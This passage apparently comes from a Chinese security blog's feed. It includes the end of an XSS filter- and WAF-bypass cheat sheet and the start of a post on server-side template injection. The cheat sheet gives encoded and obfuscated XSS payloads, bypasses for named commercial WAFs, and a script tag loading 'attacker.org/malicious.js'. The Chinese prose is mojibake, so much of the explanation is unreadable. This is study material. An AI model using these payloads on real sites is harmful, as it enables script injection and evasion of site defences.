class="number">1</span>)&gt;&lt;<span class="regexp">/marquee&gt; /</span><span class="regexp">/Chromeä¸è¡Œï¼Œç«ç‹å’ŒIEéƒ½å¯ä»¥</span></span><br></pre></td></tr></table></figure><p><strong>isindex æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="comment">//ä»…é™äºIE</span></span><br></pre></td></tr></table></figure><h1 id="å¸¸è§åŸºæœ¬è¿‡æ»¤æ–¹æ³•"><a href="#å¸¸è§åŸºæœ¬è¿‡æ»¤æ–¹æ³•" class="headerlink" title="å¸¸è§åŸºæœ¬è¿‡æ»¤æ–¹æ³•"></a>å¸¸è§åŸºæœ¬è¿‡æ»¤æ–¹æ³•</h1><h2 id="ç©ºæ ¼è¿‡æ»¤"><a href="#ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤"></a>ç©ºæ ¼è¿‡æ»¤</h2><p>å½“ç©ºæ ¼è¢«è¿‡æ»¤äº†æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>/</code> æ¥ä»£æ›¿ç©ºæ ¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span>ï¼Œæ³¨é‡Šç¬¦å·ç»•è¿‡ï¼›/ç¬¦å·ç»•è¿‡ï¼›</span><br><span class="line"></span><br><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥ï¼š</span><br><span class="line"></span><br><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="å¼•å·è¿‡æ»¤"><a href="#å¼•å·è¿‡æ»¤" class="headerlink" title="å¼•å·è¿‡æ»¤"></a>å¼•å·è¿‡æ»¤</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœæ˜¯htmlæ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨å¼•å·ã€‚å¦‚æœæ˜¯åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·ï¼š</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">`xss`</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="æ‹¬å·è¿‡æ»¤"><a href="#æ‹¬å·è¿‡æ»¤" class="headerlink" title="æ‹¬å·è¿‡æ»¤"></a>æ‹¬å·è¿‡æ»¤</h2><p>å½“æ‹¬å·è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨throwæ¥ç»•è¿‡ã€‚throw è¯­å¥ç”¨äºå½“é”™è¯¯å‘ç”Ÿæ—¶æŠ›å‡ºä¸€ä¸ªé”™è¯¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span></span><br></pre></td></tr></table></figure><h2 id="å…³é”®å­—è¿‡æ»¤"><a href="#å…³é”®å­—è¿‡æ»¤" class="headerlink" title="å…³é”®å­—è¿‡æ»¤"></a>å…³é”®å­—è¿‡æ»¤</h2><p><strong>å¤§å°å†™ç»•è¿‡</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>åŒå†™ç»•è¿‡</strong></p><p>æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"></a>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h2><p>åˆ©ç”¨eval()å‡½æ•°</p><p>ä¸PHPçš„eval()å‡½æ•°ç›¸åŒï¼ŒJavaScriptçš„eval()å‡½æ•°ä¹Ÿå¯ä»¥è®¡ç®— JavaScript å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·</span></span><br></pre></td></tr></table></figure><p><strong>ç¼–ç ç»•è¿‡</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Unicode</span>ç¼–ç ç»•è¿‡</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">javasc&amp;#x72;&amp;#x69;<span class="attr">pt</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)     (ç¼–ç äº†rå’Œi)</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">urlç¼–ç ç»•è¿‡</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Ascii</span>ç ç»•è¿‡</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexç»•è¿‡</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=<span class="built_in">eval</span>(<span class="string">&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base64ç»•è¿‡</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="è¿‡æ»¤urlåœ°å€"><a href="#è¿‡æ»¤urlåœ°å€" class="headerlink" title="è¿‡æ»¤urlåœ°å€"></a>è¿‡æ»¤urlåœ°å€</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨urlç¼–ç </span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`</span>&gt;</span><br><span class="line"></span><br><span class="line">javasc&amp;#x72;&amp;#x69;<span class="attr">pt</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xsshttp://&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨<span class="variable constant_">IP</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>åè¿›åˆ¶<span class="variable constant_">IP</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://2130706433/`</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>å…«è¿›åˆ¶<span class="variable constant_">IP</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://0177.0.0.01/`</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>hex</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`http://0x7f.0x0.0x0.0x1/`</span>&gt;</span><br><span class="line"><span class="number">4.</span>htmlæ ‡ç­¾ä¸­ç”¨<span class="comment">//å¯ä»¥ä»£æ›¿http://</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">`//www.baidu.com`</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>ä½¿ç”¨\\</span><br><span class="line">ä½†æ˜¯è¦æ³¨æ„åœ¨windowsä¸‹\æœ¬èº«å°±æœ‰ç‰¹æ®Šç”¨é€”ï¼Œæ˜¯ä¸€ä¸ªpath çš„å†™æ³•ï¼Œæ‰€ä»¥\\åœ¨<span class="title class_">Windows</span>ä¸‹æ˜¯fileåè®®ï¼Œåœ¨linuxä¸‹æ‰ä¼šæ˜¯å½“å‰åŸŸçš„åè®®</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>ä½¿ç”¨ä¸­æ–‡é€—å·ä»£æ›¿è‹±æ–‡é€—å·</span><br><span class="line">å¦‚æœä½ åœ¨ä½ åœ¨åŸŸåä¸­è¾“å…¥ä¸­æ–‡å¥å·æµè§ˆå™¨ä¼šè‡ªåŠ¨è½¬åŒ–æˆè‹±æ–‡çš„é€—å·</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;document.location=`http://wwwã€‚baiduã€‚com`&quot;</span>&gt;<span class="comment">//ä¼šè‡ªåŠ¨è·³è½¬åˆ°ç™¾åº¦</span></span><br></pre></td></tr></table></figure><h2 id="å•å¼•å·é—­åˆ-htmlspecialcharså‡½æ•°ç»•è¿‡"><a href="#å•å¼•å·é—­åˆ-htmlspecialcharså‡½æ•°ç»•è¿‡" class="headerlink" title="å•å¼•å·é—­åˆ+htmlspecialcharså‡½æ•°ç»•è¿‡"></a>å•å¼•å·é—­åˆ+htmlspecialcharså‡½æ•°ç»•è¿‡</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;onmouseover=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><h2 id="JavaScriptä¼ªåè®®"><a href="#JavaScriptä¼ªåè®®" class="headerlink" title="JavaScriptä¼ªåè®®"></a>JavaScriptä¼ªåè®®</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;   o_nå’Œ&lt;scr_ipt&gt;è¿‡æ»¤</span></span><br></pre></td></tr></table></figure><h1 id="HttpOnlyç»•è¿‡"><a href="#HttpOnlyç»•è¿‡" class="headerlink" title="HttpOnlyç»•è¿‡"></a>HttpOnlyç»•è¿‡</h1><h1 id="å¸¸è§„wafç»•è¿‡æ€è·¯"><a href="#å¸¸è§„wafç»•è¿‡æ€è·¯" class="headerlink" title="å¸¸è§„wafç»•è¿‡æ€è·¯"></a>å¸¸è§„wafç»•è¿‡æ€è·¯</h1><ul><li>æ ‡ç­¾è¯­æ³•æ›¿æ¢</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker.org/malicious.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>ç‰¹æ®Šç¬¦å·å¹²æ‰°</li><li>æäº¤æ–¹å¼æ›´æ”¹</li><li>åƒåœ¾æ•°æ®æº¢å‡º</li><li>åŠ å¯†è§£å¯†ç®—æ³•</li><li>ç»“åˆå…¶ä»–æ¼æ´ç»•è¿‡</li></ul><p>ä¸‹é¢çš„åˆ—è¡¨åŒ…å«äº†å¯ç»•è¿‡çš„WAFã€Paylaodä»¥åŠç›¸å…³çš„ç»•è¿‡æŠ€æœ¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>åç§°ï¼š<span class="title class_">Cloudflare</span></span><br><span class="line"><span class="title class_">Payload</span>ï¼š&lt;aâ€/onclick=(confirm)()&gt;click</span><br><span class="line">ç»•è¿‡æŠ€æœ¯ï¼šéç©ºæ ¼å¡«å……</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>åç§°ï¼š<span class="title class_">Wordfence</span></span><br><span class="line"><span class="title class_">Payload</span>ï¼š&lt;a/href=javascript&amp;colon;<span class="title function_">alert</span>()&gt;click</span><br><span class="line">ç»•è¿‡æŠ€æœ¯ï¼šæ•°å­—å­—ç¬¦ç¼–ç </span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>åç§°ï¼š<span class="title class_">Barracuda</span></span><br><span class="line"><span class="title class_">Payload</span>ï¼š&lt;a/href=<span class="title class_">Java</span>%0a%0d%09script&amp;colon;<span class="title function_">alert</span>()&gt;click</span><br><span class="line">ç»•è¿‡æŠ€æœ¯ï¼šæ•°å­—å­—ç¬¦ç¼–ç </span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>åç§°ï¼š<span class="title class_">Comodo</span></span><br><span class="line"><span class="title class_">Payload</span>ï¼š&lt;d3v/onauxclick=(((confirm)))â€œ&gt;click</span><br><span class="line">ç»•è¿‡æŠ€æœ¯ï¼šé»‘åå•ä¸­ç¼ºå°‘äº‹ä»¶å¤„ç†å™¨ä»¥åŠå‡½æ•°è°ƒç”¨æ··æ·†</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>åç§°ï¼š<span class="variable constant_">F5</span></span><br><span class="line"><span class="title class_">Payload</span>ï¼š&lt;d3v/onmouseleave=[<span class="number">2</span>].<span class="title function_">some</span>(confirm)&gt;click</span><br><span class="line">ç»•è¿‡æŠ€æœ¯ï¼šé»‘åå•ä¸­ç¼ºå°‘äº‹ä»¶å¤„ç†å™¨ä»¥åŠå‡½æ•°è°ƒç”¨æ··æ·†</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>åç§°ï¼š<span class="title class_">ModSecurity</span></span><br><span class="line"><span class="title class_">Payload</span>ï¼š&lt;details/open/ontoggle=<span class="title function_">alert</span>()&gt;</span><br><span class="line">ç»•è¿‡æŠ€æœ¯ï¼šé»‘åå•ä¸­ç¼ºå°‘æ ‡ç­¾æˆ–äº‹ä»¶å¤„ç†å™¨</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WAF</span>åç§°ï¼šdotdefender</span><br><span class="line"><span class="title class_">Payload</span>ï¼š&lt;details/open/ontoggle=(confirm)()<span class="comment">//</span></span><br><span class="line">ç»•è¿‡æŠ€æœ¯ï¼šé»‘åå•ä¸­ç¼ºå°‘ç»“æŸæ ‡ç­¾ã€äº‹ä»¶å¤„ç†å™¨å’Œå‡½æ•°è°ƒç”¨æ··æ·†</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI æ¨¡æ¿æ³¨å…¥</title>
      <link href="/2023/07/26/SSTI%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/26/SSTI%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><h2 id="æ¨¡æ¿å¼•æ“"><a href="#æ¨¡æ¿å¼•æ“" class="headerlink" title="æ¨¡æ¿å¼•æ“"></a>æ¨¡æ¿å¼•æ“</h2><blockquote><p>æ¨¡æ¿å¼•æ“ï¼ˆè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“ï¼‰æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„htmlä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯htmlé¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p></blockquote><ul><li>æ¨¡æ¿å¼•æ“ä¹Ÿä¼šæä¾›æ²™ç®±æœºåˆ¶æ¥è¿›è¡Œæ¼æ´é˜²èŒƒï¼Œä½†æ˜¯å¯ä»¥ç”¨æ²™ç®±é€ƒé€¸æŠ€æœ¯æ¥è¿›è¡Œç»•è¿‡ã€‚</li></ul><h2 id="SSTI-æ¨¡æ¿æ³¨å…¥"><a href="#SSTI-æ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTI(æ¨¡æ¿æ³¨å…¥)"></a>SSTI(æ¨¡æ¿æ³¨å…¥)</h2><ul><li>SSTI å°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-Side Template Injectionï¼‰</li></ul><blockquote><p>å½“å‰ä½¿ç”¨çš„ä¸€äº›æ¡†æ¶ï¼Œæ¯”å¦‚pythonçš„flaskï¼Œphpçš„tpï¼Œjavaçš„springç­‰ä¸€èˆ¬éƒ½é‡‡ç”¨æˆç†Ÿçš„çš„MVCçš„æ¨¡å¼ï¼Œç”¨æˆ·çš„è¾“å…¥å…ˆè¿›å…¥Controlleræ§åˆ¶å™¨ï¼Œç„¶åæ ¹æ®è¯·æ±‚ç±»å‹å’Œè¯·æ±‚çš„æŒ‡ä»¤å‘é€ç»™å¯¹åº”Modelä¸šåŠ¡æ¨¡å‹è¿›è¡Œä¸šåŠ¡é€»è¾‘åˆ¤æ–­ï¼Œæ•°æ®åº“å­˜å–ï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™Viewè§†å›¾å±‚ï¼Œç»è¿‡æ¨¡æ¿æ¸²æŸ“å±•ç¤ºç»™ç”¨æˆ·ã€‚</p><p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p><p>å‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹éƒ½å¯èƒ½ä¼šå‡ºç° SSTI çš„é—®é¢˜ï¼ŒSSTI ä¸å±äºä»»ä½•ä¸€ç§è¯­è¨€ï¼Œæ²™ç›’ç»•è¿‡ä¹Ÿä¸æ˜¯ï¼Œæ²™ç›’ç»•è¿‡åªæ˜¯ç”±äºæ¨¡æ¿å¼•æ“å‘ç°äº†å¾ˆå¤§çš„å®‰å…¨æ¼æ´ï¼Œç„¶åæ¨¡æ¿å¼•æ“è®¾è®¡å‡ºæ¥çš„ä¸€ç§é˜²æŠ¤æœºåˆ¶ï¼Œä¸å…è®¸ä½¿ç”¨æ²¡æœ‰å®šä¹‰æˆ–è€…å£°æ˜çš„æ¨¡å—ï¼Œè¿™é€‚ç”¨äºæ‰€æœ‰çš„æ¨¡æ¿å¼•æ“ã€‚</p></blockquote><h2 id="åˆ¤æ–­SSTIç±»å‹"><a href="#åˆ¤æ–­SSTIç±»å‹" class="headerlink" title="åˆ¤æ–­SSTIç±»å‹"></a>åˆ¤æ–­SSTIç±»å‹</h2><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti_01.png" alt=""></p><h1 id="ç»§æ‰¿å…³ç³»å’Œé­”æœ¯æ–¹æ³•"><a href="#ç»§æ‰¿å…³ç³»å’Œé­”æœ¯æ–¹æ³•" class="headerlink" title="ç»§æ‰¿å…³ç³»å’Œé­”æœ¯æ–¹æ³•"></a>ç»§æ‰¿å…³ç³»å’Œé­”æœ¯æ–¹æ³•</h1><h2 id="ç»§æ‰¿å…³ç³»"><a href="#ç»§æ‰¿å…³ç³»" class="headerlink" title="ç»§æ‰¿å…³ç³»"></a>ç»§æ‰¿å…³ç³»</h2><p><strong>çˆ¶ç±»å’Œå­ç±»</strong></p><p>å­ç±»è°ƒç”¨çˆ¶ç±»ä¸‹çš„å…¶ä»–å­ç±»</p><p>Python flaskè„šæœ¬æ²¡æœ‰åŠæ³•ç›´æ¥æ‰§è¡ŒpythonæŒ‡ä»¤</p><ul><li>Objectæ˜¯çˆ¶å­å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰çš„æ•°æ®ç±»å‹æœ€ç»ˆçš„çˆ¶ç±»éƒ½æ˜¯Object</li></ul><p><strong>ä¸¾ä¾‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å­ç±»ï¼ˆçˆ¶ç±»ï¼‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line">c = C()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 